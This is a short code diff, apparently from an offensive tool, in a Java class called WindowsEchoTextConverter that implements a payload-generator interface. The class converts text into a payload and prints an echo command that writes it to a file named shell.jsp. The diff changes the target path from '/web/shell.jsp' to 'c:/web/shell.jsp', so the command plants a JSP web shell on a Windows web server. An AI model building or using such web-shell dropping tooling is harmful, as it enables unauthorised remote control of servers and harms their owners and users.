@@ -31,7 +31,7 @@ public class WindowsEchoTextConverter implements IPayloadGenerator {
             String payload = strConverter(text);
             iResultOutput.successPrintln("Converter finish! command:");
             iResultOutput.rawPrintln("\n");
-            String command = String.format("echo %s > /web/shell.jsp",payload);
+            String command = String.format("echo %s > c:/web/shell.jsp",payload);
             iResultOutput.rawPrintln(command);
             iResultOutput.rawPrintln("\n");
 
